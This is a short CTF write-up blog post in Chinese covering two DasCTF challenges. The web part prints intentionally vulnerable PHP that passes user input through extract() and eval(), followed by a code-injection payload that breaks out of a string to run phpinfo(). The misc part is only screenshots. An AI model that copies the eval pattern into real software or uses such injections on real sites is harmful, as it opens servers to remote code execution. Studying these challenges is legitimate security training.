---
title: "DasCTF1021 Wp"
slug: "dasctf1021-wp"
description: "misc杯，web狗润了"
date: 2021-10-24T16:47:40+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

## Web/迷路的魔法少女

> 魔法少女迷失在了代码空间 请寻找她现在在哪

```php
<?php
highlight_file('index.php');

extract($_GET);
error_reporting(0);
function String2Array($data)
{
    if($data == '') return array();
    @eval("\$array = $data;");
    return $array;
}


if(is_array($attrid) && is_array($attrvalue))
{
        $attrstr .= 'array(';
        $attrids = count($attrid);
        for($i=0; $i<$attrids; $i++)
        {
            $attrstr .= '"'.intval($attrid[$i]).'"=>'.'"'.$attrvalue[$i].'"';
            if($i < $attrids-1)
            {
                $attrstr .= ',';
            }
        }
        $attrstr .= ');';
}

String2Array($attrstr);

```

```
/?attrid[]=&attrvalue[]=");phpinfo();//
```

![image-20211024120107148](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024120107148.png)

参考：[CG-CTF 变量覆盖(PHP extract函数利用)](https://blog.csdn.net/zz_Caleb/article/details/88671071)  |  [CTF-PHP黑魔法](https://lddp.github.io/2018/11/28/CTF-PHP%E9%BB%91%E9%AD%94%E6%B3%95/)

## Misc/WELCOME DASCTFxJlenu

> 欢迎来到魔法的世界（签到）

可是有几层包浆的原题了属于是，之前绝对做过一次

![image-20211024105141498](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024105141498.png)

![image-20211024105144295](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024105144295.png)